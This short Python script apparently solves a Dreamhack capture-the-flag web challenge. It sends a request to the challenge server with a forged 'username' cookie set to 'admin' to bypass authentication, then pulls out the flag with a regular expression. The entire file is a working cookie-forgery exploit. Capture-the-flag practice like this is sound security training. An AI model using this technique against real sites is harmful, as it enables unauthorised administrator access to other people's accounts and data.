import requests
import re

URL = "http://host3.dreamhack.games:24072"

resp = requests.get(URL, cookies={'username': 'admin'})
match = re.search(r'DH\{[^]]*\}', resp.text)

print(match.group(0))